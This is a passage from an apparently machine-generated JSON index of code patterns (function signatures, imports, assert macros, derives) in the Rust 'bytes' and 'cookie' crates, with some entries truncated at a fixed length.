          "/// assert_eq!(buf, b\"hello world\");",
          "///     assert_eq!(1, buf.remaining_mut());",
          "/// assert_eq!(b\"hello\\0\", &dst);",
          "///     assert_eq!(2, buf.remaining_mut());",
          "/// assert_eq!(b\"aaaa\\0\\0\", &dst);",
          "/// assert_eq!(buf, b\"\\x01\");",
          "/// assert_eq!(buf, b\"\\x01\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\");",
          "/// assert_eq!(buf, b\"\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\");",
          "///     assert_eq!(buf, b\"\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\");",
          "/// assert_eq!(buf, b\"\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\");",
          "///     assert_eq!(buf, b\"\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "/// assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "///     assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "/// assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x08\\x09\\xA0\\xA1\");",
          "///     assert_eq!(buf, b\"\\xA1\\xA0\\x09\\x08\");",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "///     assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "/// assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\");",
          "///     assert_eq!(buf, b\"\\x08\\x07\\x06\\x05\\x04\\x03\\x02\\x01\");",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x14\\x",
          "/// assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x03\\x",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x",
          "///     assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x14\\x",
          "/// assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x03\\x",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\\x04\\x05\\x06\\x07\\x08\\x09\\x10\\x11\\x12\\x13\\x",
          "///     assert_eq!(buf, b\"\\x16\\x15\\x14\\x13\\x12\\x11\\x10\\x09\\x08\\x07\\x06\\x05\\x04\\x",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "/// assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "///     assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "/// assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x01\\x02\\x03\");",
          "///     assert_eq!(buf, b\"\\x03\\x02\\x01\");",
          "if cfg!(target_endian = \"big\") {",
          "/// assert_eq!(buf, b\"\\x3F\\x99\\x99\\x9A\");",
          "/// assert_eq!(buf, b\"\\x9A\\x99\\x99\\x3F\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x3F\\x99\\x99\\x9A\");",
          "///     assert_eq!(buf, b\"\\x9A\\x99\\x99\\x3F\");",
          "/// assert_eq!(buf, b\"\\x3F\\xF3\\x33\\x33\\x33\\x33\\x33\\x33\");",
          "/// assert_eq!(buf, b\"\\x33\\x33\\x33\\x33\\x33\\x33\\xF3\\x3F\");",
          "/// if cfg!(target_endian = \"big\") {",
          "///     assert_eq!(buf, b\"\\x3F\\xF3\\x33\\x33\\x33\\x33\\x33\\x33\");",
          "///     assert_eq!(buf, b\"\\x33\\x33\\x33\\x33\\x33\\x33\\xF3\\x3F\");",
          "/// assert_eq!(arr.remaining_mut(), 128);",
          "/// assert_eq!(dst.remaining_mut(), 10);",
          "/// assert_eq!(11, num);",
          "/// assert_eq!(*buf, b\"hello world\"[..]);",
          "/// assert_eq!(&a[..], b\"hello\");",
          "/// assert_eq!(&b[..], b\" world\");",
          "deref_forward_bufmut!();",
          "deref_forward_bufmut!();"
        ],
        "derives": [],
        "error_handling": 7
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/take.rs",
        "function_defs": [
          "fn remaining(&self) -> usize {",
          "fn chunk(&self) -> &[u8] {",
          "fn advance(&mut self, cnt: usize) {",
          "fn copy_to_bytes(&mut self, len: usize) -> crate::Bytes {",
          "fn chunks_vectored<'a>(&'a self, dst: &mut [IoSlice<'a>]) -> usize {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::Buf;",
          "use core::cmp;",
          "use std::io::IoSlice;"
        ],
        "macros": [
          "/// assert_eq!(*dst, b\"he\"[..]);",
          "/// assert_eq!(*dst, b\"llo world\"[..]);",
          "/// assert_eq!(11, buf.get_ref().remaining());",
          "/// assert_eq!(*dst, b\"ll\"[..]);",
          "/// assert_eq!(2, buf.limit());",
          "/// assert_eq!(b'h', buf.get_u8());",
          "/// assert_eq!(1, buf.limit());",
          "/// assert_eq!(*dst, b\"he\"[..]);",
          "/// assert_eq!(*dst, b\"llo\"[..]);",
          "assert!(cnt <= self.limit);",
          "assert!(len <= self.remaining(), \"`len` greater than remaining\");"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/writer.rs",
        "function_defs": [
          "fn write(&mut self, src: &[u8]) -> io::Result<usize> {",
          "fn flush(&mut self) -> io::Result<()> {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::BufMut;",
          "use std::{cmp, io};"
        ],
        "macros": [
          "/// assert_eq!(1024, buf.get_ref().capacity());",
          "/// assert_eq!(1024, buf.get_ref().capacity());",
          "/// assert_eq!(*buf, b\"hello world\"[..]);"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 1
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/bytes-1.11.0/src/buf/reader.rs",
        "function_defs": [
          "fn read(&mut self, dst: &mut [u8]) -> io::Result<usize> {",
          "fn fill_buf(&mut self) -> io::Result<&[u8]> {",
          "fn consume(&mut self, amt: usize) {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [
          "use crate::Buf;",
          "use std::{cmp, io};"
        ],
        "macros": [
          "/// assert_eq!(b\"hello world\", buf.get_ref());",
          "/// assert_eq!(0, buf.remaining());"
        ],
        "derives": [
          "#[derive(Debug)]"
        ],
        "error_handling": 1
      }
    ],
    "ts_patterns": []
  },
  {
    "project": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0",
    "name": "cookie-0.17.0",
    "languages": [
      "Rust"
    ],
    "python_patterns": [],
    "rust_patterns": [
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/build.rs",
        "function_defs": [
          "fn main() {"
        ],
        "struct_defs": [],
        "impl_blocks": [],
        "uses": [],
        "macros": [
          "println!(\"cargo:rustc-cfg=nightly\");"
        ],
        "derives": [],
        "error_handling": 0
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/expiration.rs",
        "function_defs": [
          "fn from(option: T) -> Self {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl Expiration {"
        ],
        "uses": [
          "use time::OffsetDateTime;"
        ],
        "macros": [
          "/// assert_eq!(expires, Expiration::Session);",
          "/// assert_eq!(expires, Expiration::DateTime(now));",
          "/// assert_eq!(expires, Expiration::DateTime(now));",
          "/// assert!(!expires.is_datetime());",
          "/// assert!(expires.is_datetime());",
          "/// assert!(expires.is_session());",
          "/// assert!(!expires.is_session());",
          "/// assert!(expires.datetime().is_none());",
          "/// assert_eq!(expires.datetime(), Some(now));",
          "/// assert_eq!(expires.map(|t| t + one_week).datetime(), Some(now + one_week));",
          "/// assert_eq!(expires.map(|t| t + one_week).datetime(), None);"
        ],
        "derives": [
          "#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]"
        ],
        "error_handling": 5
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/lib.rs",
        "function_defs": [
          "fn indexed(needle: &str, haystack: &str) -> Option<CookieStr<'static>> {",
          "fn to_str<'s>(&'s self, string: Option<&'s Cow<str>>) -> &'s str {",
          "fn to_raw_str<'s, 'b: 's>(&'s self, string: &'s Cow<'b, str>) -> Option<&'b str> {",
          "fn into_owned(self) -> CookieStr<'static> {",
          "fn fmt_parameters(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn next(&mut self) -> Option<Self::Item> {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn new_encoded(cookie: &'a Cookie<'c>) -> Self {",
          "fn new_stripped(cookie: &'a Cookie<'c>) -> Self {",
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {",
          "fn from_str(s: &str) -> Result<Cookie<'static>, ParseError> {",
          "fn eq(&self, other: &Cookie<'b>) -> bool {",
          "fn format() {",
          "fn format_date_wraps() {",
          "fn cookie_string_long_lifetimes() {",
          "fn owned_cookie_string() {",
          "fn owned_cookie_struct() {",
          "fn format_encoded() {",
          "fn split_parse() {",
          "fn split_parse_encoded() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl FromStr for Cookie<'static> {"
        ],
        "uses": [
          "use std::borrow::Cow;",
          "use std::fmt;",
          "use std::str::FromStr;",
          "use std::ascii::AsciiExt;",
          "use time::{Duration, OffsetDateTime, UtcOffset, macros::datetime};",
          "use crate::parse::parse_cookie;",
          "use crate::CookieStr::*;",
          "use percent_encoding::{AsciiSet, CONTROLS};",
          "use crate::{Cookie, SameSite, parse::parse_date};",
          "use time::{Duration, OffsetDateTime};"
        ],
        "macros": [
          "converting indexed str to str! (This is a module invariant.)\");",
          "/// assert_eq!(&cookie.to_string(), \"name=value\");",
          "/// assert_eq!(cookie.name_value(), (\"name\", \"value\"));",
          "/// assert_eq!(cookie.name(), \"name\");",
          "/// assert!(cookie.value().is_empty());",
          "/// assert_eq!(c.name_value(), (\"foo\", \"bar\"));",
          "/// assert_eq!(c.name_value(), (\"foo\", \"bar%20baz\"));",
          "/// assert_eq!(c.http_only(), Some(true));",
          "/// assert_eq!(c.secure(), None);",
          "/// assert_eq!(c.name_value(), (\"foo\", \"bar baz\"));",
          "/// assert_eq!(c.http_only(), Some(true));",
          "/// assert_eq!(c.secure(), None);",
          "/// # assert_eq!(values.len(), 2);",
          "/// # assert_eq!(values[0].as_ref().unwrap().name(), \"name\");",
          "/// # assert_eq!(values[1].as_ref().unwrap().name(), \"other\");",
          "///         \"name\" => assert_eq!(cookie.value(), \"value\"),",
          "///         \"other\" => assert_eq!(cookie.value(), \"key%20value\"),",
          "///         _ => unreachable!()",
          "/// # assert_eq!(v.len(), 2);",
          "/// # assert_eq!(v[0].as_ref().unwrap().name_value(), (\"name\", \"value\"));",
          "/// # assert_eq!(v[1].as_ref().unwrap().name_value(), (\"other\", \"key value\"));",
          "///         \"name\" => assert_eq!(cookie.value(), \"value\"),",
          "///         \"other\" => assert_eq!(cookie.value(), \"key value\"),",
          "///         _ => unreachable!()",
          "/// assert_eq!(owned_cookie.name_value(), (\"a\", \"b\"));",
          "/// assert_eq!(c.name(), \"name\");",
          "/// assert_eq!(c.value(), \"value\");",
          "/// assert_eq!(c.name_value(), (\"name\", \"value\"));",
          "/// assert_eq!(c.http_only(), Some(true));",
          "/// assert_eq!(c.http_only(), None);",
          "/// assert_eq!(c.http_only(), None);",
          "/// assert_eq!(c.http_only(), Some(false));",
          "/// assert_eq!(c.http_only(), Some(true));",
          "/// assert_eq!(c.secure(), Some(true));",
          "/// assert_eq!(c.secure(), None);",
          "/// assert_eq!(c.secure(), None);",
          "/// assert_eq!(c.secure(), Some(false));",
          "/// assert_eq!(c.secure(), Some(true));",
          "/// assert_eq!(c.same_site(), Some(SameSite::Lax));",
          "/// assert_eq!(c.max_age(), None);",
          "/// assert_eq!(c.max_age().map(|age| age.whole_hours()), Some(1));",
          "/// assert_eq!(c.path(), None);",
          "/// assert_eq!(c.path(), Some(\"/\"));",
          "/// assert_eq!(c.path(), Some(\"/sub\"));",
          "/// assert_eq!(c.domain(), None);",
          "/// assert_eq!(c.domain(), Some(\"crates.io\"));",
          "/// assert_eq!(c.domain(), Some(\"crates.io\"));",
          "/// assert_eq!(c.domain(), Some(\".crates.io\"));",
          "/// assert_eq!(c.expires(), None);",
          "/// assert_eq!(c.expires(), Some(Expiration::Session));",
          "/// let cookie_str = format!(\"name=value; Expires={}\", expire_time);",
          "/// assert_eq!(c.expires().and_then(|e| e.datetime()).map(|t| t.year()), Some(20",
          "/// assert_eq!(c.expires_datetime(), None);",
          "/// assert_eq!(c.expires_datetime(), None);",
          "/// let cookie_str = format!(\"name=value; Expires={}\", expire_time);",
          "/// assert_eq!(c.expires_datetime().map(|t| t.year()), Some(2017));",
          "/// assert_eq!(c.name(), \"name\");",
          "/// assert_eq!(c.name(), \"foo\");",
          "/// assert_eq!(c.value(), \"value\");",
          "/// assert_eq!(c.value(), \"bar\");",
          "/// assert_eq!(c.http_only(), None);",
          "/// assert_eq!(c.http_only(), Some(true));",
          "/// assert_eq!(c.http_only(), Some(false));",
          "/// assert_eq!(c.http_only(), None);",
          "/// assert_eq!(c.secure(), None);",
          "/// assert_eq!(c.secure(), Some(true));",
          "/// assert_eq!(c.secure(), Some(false));",
          "/// assert_eq!(c.secure(), None);",
          "/// assert_eq!(c.same_site(), None);",
          "/// assert_eq!(c.same_site(), Some(SameSite::None));",
          "/// assert_eq!(c.to_string(), \"name=value; SameSite=None; Secure\");",
          "/// assert_eq!(c.to_string(), \"name=value; SameSite=None\");",
          "/// assert_eq!(c.same_site(), None);",
          "/// assert_eq!(c.same_site(), Some(SameSite::Strict));",
          "/// assert_eq!(c.to_string(), \"name=value; SameSite=Strict\");",
          "/// assert_eq!(c.same_site(), None);",
          "/// assert_eq!(c.to_string(), \"name=value\");",
          "/// assert_eq!(c.max_age(), None);",
          "/// assert_eq!(c.max_age(), Some(Duration::hours(10)));",
          "/// assert!(c.max_age().is_none());",
          "/// assert_eq!(c.path(), None);",
          "/// assert_eq!(c.path(), Some(\"/\"));",
          "/// assert_eq!(c.path(), None);",
          "/// assert_eq!(c.path(), Some(\"/\"));",
          "/// assert_eq!(c.path(), None);",
          "/// assert_eq!(c.domain(), None);",
          "/// assert_eq!(c.domain(), Some(\"rust-lang.org\"));",
          "/// assert_eq!(c.domain(), None);",
          "/// assert_eq!(c.domain(), Some(\"rust-lang.org\"));",
          "/// assert_eq!(c.domain(), None);",
          "/// assert_eq!(c.expires(), None);",
          "/// assert!(c.expires().is_some());",
          "/// assert_eq!(c.expires(), Some(Expiration::Session));",
          "static MAX_DATETIME: OffsetDateTime = datetime!(9999-12-31 23:59:59.999_999 UTC)",
          "/// assert_eq!(c.expires(), None);",
          "/// assert_eq!(c.expires(), Some(Expiration::Session));",
          "/// assert_eq!(c.expires(), None);",
          "/// assert!(c.expires().is_none());",
          "/// assert!(c.max_age().is_none());",
          "/// assert!(c.expires().is_some());",
          "/// assert_eq!(c.max_age(), Some(Duration::days(365 * 20)));",
          "/// assert_eq!(c.max_age(), Some(Duration::days(365 * 20)));",
          "/// assert_eq!(c.value(), \"bar\");",
          "/// assert_eq!(c.value(), \"\");",
          "/// assert_eq!(c.max_age(), Some(Duration::ZERO));",
          "write!(f, \"; HttpOnly\")?;",
          "write!(f, \"; SameSite={}\", same_site)?;",
          "write!(f, \"; Secure\")?;",
          "write!(f, \"; Secure\")?;",
          "write!(f, \"; Path={}\", path)?;",
          "write!(f, \"; Domain={}\", domain)?;",
          "write!(f, \"; Max-Age={}\", max_age.whole_seconds())?;",
          "write!(f, \"; Expires={}\", time.format(&crate::parse::FMT1).map_err(|_| fmt::Erro",
          "/// let cookie_string = format!(\"{}={}\", \"foo\", \"bar\");",
          "/// assert_eq!(name, Some(\"foo\"));",
          "/// let cookie_string = format!(\"{}={}\", \"foo\", \"bar\");",
          "/// assert_eq!(value, Some(\"bar\"));",
          "/// let cookie_string = format!(\"{}={}; Path=/\", \"foo\", \"bar\");",
          "/// assert_eq!(path, Some(\"/\"));",
          "/// let cookie_string = format!(\"{}={}; Domain=.crates.io\", \"foo\", \"bar\");",
          "/// assert_eq!(domain, Some(\"crates.io\"));",
          "/// assert_eq!(&c.encoded().to_string(), \"my%20name=this%3B%20value%3F; Secure\")",
          "/// assert_eq!(&c.encoded().stripped().to_string(), \"my%20name=this%3B%20value%3",
          "/// assert_eq!(&c.stripped().to_string(), \"key?=value\");",
          "assert_eq!(&c.stripped().encoded().to_string(), \"key%3F=value\");",
          "/// assert_eq!(&c.stripped().to_string(), \"my name=this; value%?\");",
          "assert_eq!(&c.encoded().to_string(), \"my%20name=this%3B%20value%25%3F; Secure\");",
          "assert_eq!(&c.stripped().encoded().to_string(), \"my%20name=this%3B%20value%25%3F",
          "assert_eq!(&c.encoded().stripped().to_string(), \"my%20name=this%3B%20value%25%3F",
          "write!(f, \"{}={}\", name, value)?;",
          "write!(f, \"{}={}\", self.cookie.name(), self.cookie.value())?;",
          "write!(f, \"{}={}\", self.cookie.name(), self.cookie.value())?;",
          "/// assert_eq!(&cookie.to_string(), \"foo=bar; Path=/\");",
          "write!(f, \"{}={}\", self.name(), self.value())?;",
          "assert_eq!(&cookie.to_string(), \"foo=bar\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; HttpOnly\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Max-Age=10\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Secure\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Path=/\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Domain=www.rust-lang.org\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Domain=rust-lang.org\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Domain=rust-lang.org\");",
          "assert_eq!(&cookie.to_string(),",
          "assert_eq!(&cookie.to_string(), \"foo=bar; SameSite=Strict\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; SameSite=Lax\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; SameSite=None; Secure\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; SameSite=None\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; SameSite=None; Secure\");",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Expires=Fri, 31 Dec 9999 23:59:59 GMT\"",
          "let expires = time::macros::datetime!(9999-01-01 0:00 UTC) + Duration::days(1000",
          "assert_eq!(&cookie.to_string(), \"foo=bar; Expires=Fri, 31 Dec 9999 23:59:59 GMT\"",
          "assert_eq!(name, Some(\"bar\"));",
          "assert_eq!(value, Some(\"baz\"));",
          "assert_eq!(path, Some(\"/subdir\"));",
          "assert_eq!(domain, Some(\"crates.io\"));",
          "assert_eq!(name, None);",
          "assert_eq!(value, None);",
          "assert_eq!(path, None);",
          "assert_eq!(domain, None);",
          "assert_eq!(name, None);",
          "assert_eq!(value, None);",
          "assert_eq!(path, None);",
          "assert_eq!(domain, None);",
          "assert_eq!(&cookie_str, \"foo%20!%25%3F%3D=bar%3B%3B%2C%20a\");",
          "assert_eq!(cookie.name_value(), (\"foo !%?=\", \"bar;;, a\"));",
          "assert_eq!(expected, actual);",
          "assert_eq!(expected, actual);"
        ],
        "derives": [
          "#[derive(Debug, Clone)]",
          "#[derive(Debug, Clone)]"
        ],
        "error_handling": 72
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/jar.rs",
        "function_defs": [
          "fn next(&mut self) -> Option<&'a Cookie<'static>> {",
          "fn next(&mut self) -> Option<&'a Cookie<'static>> {",
          "fn simple() {",
          "fn jar_is_send() {",
          "fn is_send<T: Send>(_: T) -> bool {",
          "fn iter() {",
          "fn delta() {",
          "fn replace_original() {",
          "fn empty_delta() {",
          "fn add_remove_add() {",
          "fn replace_remove() {",
          "fn remove_with_path() {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl CookieJar {"
        ],
        "uses": [
          "use std::collections::HashSet;",
          "use crate::delta::DeltaCookie;",
          "use crate::Cookie;",
          "use std::collections::hash_set::Iter as HashSetIter;",
          "use std::collections::hash_set::Difference;",
          "use std::collections::hash_map::RandomState;",
          "use std::iter::Chain;",
          "use super::CookieJar;",
          "use crate::Cookie;",
          "use std::collections::HashMap;",
          "use time::Duration;"
        ],
        "macros": [
          "/// assert_eq!(jar.get(\"a\").map(|c| c.value()), Some(\"one\"));",
          "/// assert_eq!(jar.get(\"b\").map(|c| c.value()), Some(\"two\"));",
          "/// assert!(jar.get(\"b\").is_none());",
          "/// assert_eq!(jar.delta().count(), 0);",
          "/// assert_eq!(jar.delta().count(), 2);",
          "/// assert_eq!(jar.delta().count(), 3);",
          "/// assert_eq!(jar.delta().count(), 2);",
          "/// assert_eq!(jar.iter().count(), 0);",
          "/// assert!(jar.get(\"name\").is_none());",
          "/// assert_eq!(jar.get(\"name\").map(|c| c.value()), Some(\"value\"));",
          "/// assert_eq!(jar.get(\"name\").map(|c| c.value()), Some(\"value\"));",
          "/// assert_eq!(jar.get(\"second\").map(|c| c.value()), Some(\"two\"));",
          "/// assert_eq!(jar.iter().count(), 2);",
          "/// assert_eq!(jar.delta().count(), 0);",
          "/// assert_eq!(jar.get(\"name\").map(|c| c.value()), Some(\"value\"));",
          "/// assert_eq!(jar.get(\"second\").map(|c| c.value()), Some(\"two\"));",
          "/// assert_eq!(jar.iter().count(), 2);",
          "/// assert_eq!(jar.delta().count(), 2);",
          "/// assert_eq!(delta.len(), 1);",
          "/// assert_eq!(delta[0].name(), \"name\");",
          "/// assert_eq!(delta[0].max_age(), Some(Duration::seconds(0)));",
          "/// assert_eq!(jar.delta().count(), 1);",
          "/// assert_eq!(jar.delta().count(), 0);",
          "/// assert_eq!(jar.delta().count(), 1);",
          "/// assert_eq!(jar.delta().count(), 1);",
          "/// assert_eq!(jar.delta().count(), 1);",
          "/// assert_eq!(jar.iter().count(), 2);",
          "/// assert_eq!(jar.delta().count(), 1);",
          "/// assert_eq!(jar.iter().count(), 1);",
          "/// assert_eq!(jar.delta().count(), 0);",
          "/// assert_eq!(jar.iter().count(), 0);",
          "/// assert_eq!(jar.get(\"name\"), None);",
          "/// assert_eq!(jar.get(\"language\").map(Cookie::value), Some(\"C++\"));",
          "/// assert_eq!(jar.iter().count(), 1);",
          "/// assert_eq!(jar.delta().count(), 2);",
          "/// assert_eq!(jar.get(\"name\").map(Cookie::value), Some(\"value\"));",
          "/// assert_eq!(jar.get(\"language\").map(Cookie::value), Some(\"Rust\"));",
          "/// assert_eq!(jar.iter().count(), 2);",
          "/// assert_eq!(jar.delta().count(), 0);",
          "/// assert_eq!(jar.delta().count(), 3);",
          "/// # assert_eq!(jar.iter().count(), 3);",
          "///         \"second\" => assert_eq!(cookie.value(), \"two\"),",
          "///         \"new\" => assert_eq!(cookie.value(), \"third\"),",
          "///         \"yac\" => assert_eq!(cookie.value(), \"fifth\"),",
          "///         _ => unreachable!(\"there are only three cookies in the jar\")",
          "/// assert_ne!(jar.get(\"private\").unwrap().value(), \"text\");",
          "/// assert_eq!(jar.private(&key).get(\"private\").unwrap().value(), \"text\");",
          "/// assert!(jar.private(&key).get(\"private\").is_none());",
          "/// assert!(jar.get(\"private\").is_some());",
          "/// assert_ne!(jar.get(\"signed\").unwrap().value(), \"text\");",
          "/// assert!(jar.get(\"signed\").unwrap().value().contains(\"text\"));",
          "/// assert_eq!(jar.signed(&key).get(\"signed\").unwrap().value(), \"text\");",
          "/// assert!(jar.signed(&key).get(\"signed\").is_none());",
          "/// assert!(jar.get(\"signed\").is_some());",
          "assert!(c.get(\"test\").is_none());",
          "assert!(c.get(\"test2\").is_some());",
          "assert!(c.get(\"test\").is_none());",
          "assert!(c.get(\"test2\").is_none());",
          "assert!(c.get(\"test3\").is_none());",
          "assert!(is_send(CookieJar::new()))",
          "assert_eq!(c.iter().count(), 4);",
          "assert_eq!(c.iter().count(), 6);",
          "assert_eq!(c.iter().count(), 5);",
          "assert_eq!(c.iter().count(), 3);",
          "assert_eq!(c.iter().count(), 4);",
          "assert_eq!(c.iter().count(), 3);",
          "assert_eq!(c.delta().count(), 4);",
          "assert!(names.get(\"test2\").unwrap().is_none());",
          "assert!(names.get(\"test3\").unwrap().is_none());",
          "assert!(names.get(\"test4\").unwrap().is_none());",
          "assert_eq!(names.get(\"original\").unwrap(), &Some(Duration::seconds(0)));",
          "assert_eq!(jar.get(\"original_a\").unwrap().value(), \"a\");",
          "assert_eq!(jar.get(\"original_a\").unwrap().value(), \"av2\");",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().count(), 0);",
          "assert_eq!(jar.delta().count(), 0);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().count(), 0);",
          "assert_eq!(jar.delta().filter(|c| c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().filter(|c| c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().filter(|c| c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().filter(|c| !c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().filter(|c| c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().count(), 0);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().filter(|c| !c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.delta().filter(|c| c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.iter().count(), 1);",
          "assert_eq!(jar.delta().count(), 0);",
          "assert_eq!(jar.iter().filter(|c| c.path().is_none()).count(), 1);",
          "assert_eq!(jar.iter().count(), 0);",
          "assert_eq!(jar.delta().count(), 1);",
          "assert_eq!(jar.delta().filter(|c| c.value().is_empty()).count(), 1);",
          "assert_eq!(jar.delta().filter(|c| c.path() == Some(\"/\")).count(), 1);"
        ],
        "derives": [
          "#[derive(Default, Debug, Clone)]"
        ],
        "error_handling": 14
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/draft.rs",
        "function_defs": [
          "fn fmt(&self, f: &mut fmt::Formatter) -> fmt::Result {"
        ],
        "struct_defs": [],
        "impl_blocks": [
          "impl SameSite {",
          "impl fmt::Display for SameSite {"
        ],
        "uses": [
          "use std::fmt;"
        ],
        "macros": [
          "/// assert!(strict.is_strict());",
          "/// assert!(!strict.is_lax());",
          "/// assert!(!strict.is_none());",
          "/// assert!(lax.is_lax());",
          "/// assert!(!lax.is_strict());",
          "/// assert!(!lax.is_none());",
          "/// assert!(none.is_none());",
          "/// assert!(!none.is_lax());",
          "/// assert!(!none.is_strict());",
          "SameSite::Strict => write!(f, \"Strict\"),",
          "SameSite::Lax => write!(f, \"Lax\"),",
          "SameSite::None => write!(f, \"None\"),"
        ],
        "derives": [
          "#[derive(Debug, Clone, Copy, PartialEq, Eq, Hash)]"
        ],
        "error_handling": 4
      },
      {
        "file": "/Volumes/Plex/DevSymlinks/cargo_registry/src/index.crates.io-1949cf8c6b5b557f/cookie-0.17.0/src/parse.rs",
        "function_defs": [
